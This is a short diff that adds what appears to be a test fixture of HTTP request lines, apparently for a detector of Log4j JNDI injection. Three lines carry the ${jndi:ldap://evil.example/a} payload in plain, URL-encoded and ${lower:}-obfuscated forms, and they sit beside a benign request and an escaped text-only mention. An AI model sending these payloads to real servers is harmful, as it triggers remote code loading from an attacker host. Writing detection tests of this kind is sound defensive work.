@@ -1,0 +1,5 @@
+GET /home HTTP/1.1
+GET /?q=${jndi:ldap://evil.example/a} HTTP/1.1
+GET /?q=%24%7Bjndi%3Aldap%3A%2F%2Fevil.example%2Fa%7D HTTP/1.1
+GET /?q=${${lower:j}${lower:n}${lower:d}${lower:i}:ldap://evil.example/a} HTTP/1.1
+Security scanner report mentions \${jndi:ldap://example.com/a} as text
